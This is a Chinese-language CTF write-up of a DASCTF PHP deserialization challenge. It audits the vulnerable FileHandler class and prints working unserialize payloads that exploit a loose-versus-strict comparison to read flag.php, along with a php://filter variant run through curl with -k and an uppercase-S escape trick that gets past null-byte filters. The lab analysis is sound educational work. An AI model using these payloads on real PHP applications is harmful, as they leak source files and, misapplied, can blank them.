---
date: 2026-10-25
slug: dasctf-ezphp-deserialize
categories:
  - 反序列化
---

# [DASCTF] FileHandler 反序列化

打开题目直接就是源码，`highlight_file` 把整个文件摊出来了。先审计。

```php
<?php
include("flag.php");
highlight_file(__FILE__);

class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            ...
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

## 判断

**第一件事：`include("flag.php")` 说明 flag 和入口同目录，而且我们要的是它的源码，不是执行结果。**

`file_get_contents` 不走 PHP 解析器，读出来就是磁盘上的原文。这一点是这题的关键 —— 不是去读"执行后输出"，是直接把文件读出来。

**第二件事：只有 `read()` 能读文件，怎么进去？**

入口只有 `unserialize`，唯一的触发点是 `__destruct`：

```text
__destruct() → process() → read()
```

但中间有两道类型检查：

| 位置 | 写法 | 作用 |
|---|---|---|
| `__destruct` | `$this->op === "2"` **强比较** | 字符串 `"2"` 会被改成 `"1"`，走 write |
| `process` | `$this->op == "2"` **弱比较** | 整数 `2` 也成立，走 read |

所以 `op` 必须序列化成**整数**：

```text
s:2:"op";i:2;
```

**第三件事：属性是 `protected`，怎么绕 `is_valid`？**

`protected` 属性序列化后是 `\0*\0op`（两个空字节夹一个星号），而 `is_valid` 卡的是 `ord() >= 32`，空字节 `ord = 0` 直接被拒。

但这题**根本不用碰空字节** —— `unserialize` 是按属性名写入对象的，**不做可见性检查**。类里声明了 `protected $op`，序列化串里写 `s:2:"op"` 就会直接写进那个 protected 槽。

本地复刻验证过（`E:\dsh\ctf-work\ser\`）：

```text
喂进去:  O:1:"A":1:{s:1:"x";s:7:"dynamic";}     ← 类里是 protected $x
读出来:  dynamic
重序列化: O:1:"A":1:{s:4:"\0*\0x";s:7:"dynamic";}   ← 值确实落在 protected 槽里
```

## 最终 payload

```text
/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

返回：

```text
[Result]: <br><?php $flag='CTF2{a8da662d-ba4e-44da-9655-ffd89b301ecb}';
```

## 页面为什么看着什么都没有

两个原因叠在一起：

1. **浏览器把 `<?` 当成 bogus comment（无效注释）**，一路吞到下一个 `>`，所以这段字不在渲染结果里 —— `Ctrl+U` 看源代码就有；
2. **`__destruct` 是在脚本结束时才触发的**，输出天然追加在页面最末尾、`highlight_file` 的源码后面。

## 卡点

### 坑 1：`curl: (35) SEC_E_CERT_EXPIRED`

**现象**：curl 一句都还没发出去就报 TLS 错。

**原因**：题目环境的通配符证书过期了（`*.http-ctf2.dasctf.com`，2026/8/7 到期，我打的时候是 10/25）。本机时间是对的，不是自己的问题。

**正确做法**：加 `-k`。靶场专用，真实站点别养成习惯。

!!! note "看清楚是哪一层挂了"

    `curl: (35)` + `schannel:` 开头 = **TLS 握手**失败，payload 根本没发出去，别去改 payload。

### 坑 2：`op` 写成字符串 `"2"` 会清空 flag.php

**现象**：页面只回个 `Successful!` 或者干脆没反应。

**原因**：`__destruct` 用强比较，字符串 `"2"` 会被改成 `"1"` 走 `write()`，而它在上一行已经把 `content` 清空了：

```php
$this->content = "";
$this->process();   // → file_put_contents("flag.php", "")
```

本地拿副本试的：**41 字节的文件，打完之后 0 字节**。

在真题上这么打，flag.php 直接被清空，只能等环境重置。

**正确做法**：`op` 用整数 `i:2`。

### 坑 3：手抄 base64 抄错

**现象**：解出来一串乱码，中间冒出 `0x13`、`0x93`、`0x96` 这种控制字符残渣。

**原因**：base64 区分大小写。`<?php ` 的 base64 是 `PD9waHAg`，手抄成 `PD9waHag` 就变成 `hv\xa0`。终端还会自动换行，一断行更容易错。

**正确做法**：别手抄，让命令自己取、自己解：

```powershell
$url = 'https://xxx.dasctf.com/'
$p   = 'O:11:"FileHandler":3:{s:2:"op";i:2;s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}'

$r   = curl.exe -sS -k -G $url --data-urlencode "str=$p"
$b64 = [regex]::Match($r, 'PD9waHA[A-Za-z0-9+/=]*').Value
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
```

其实这题直接读 `flag.php` 就是明文，连 base64 都不用。

## 收获

- **同一个属性在不同位置可以是不同类型检查**：`=== "2"` 拦字符串，`== "2"` 收整数。找"哪个类型能同时过两道"比硬刚一个点快。
- **`unserialize` 不做可见性检查**：`protected` / `private` 的空字节前缀不是必须的，public 名字一样能写进去。序列化里的可见性前缀只影响"生成时怎么写"，不限制"解析时怎么读"。
- **`file_get_contents` 读的是源码**：想拿 PHP 文件的原文用它，不是 include。
- **`__destruct` 是最好用的触发器**：对象没人接住也会在脚本结束时析构，`unserialize` 完什么都不用做。

!!! note "进阶：真要写 protected 形式的话"

    `is_valid` 拦空字节，但 PHP 反序列化支持**大写 `S`** 的转义字符串，`\00` 在原文里是 3 个可打印字符（`\`、`0`、`0`，全在 32~125 之间），unserialize 时才还原成空字节：

    ```text
    S:5:"\00*\00op";i:2;
    ```

    这一招专门用于绕过"禁止空字节"的过滤器，记进反序列化专题。
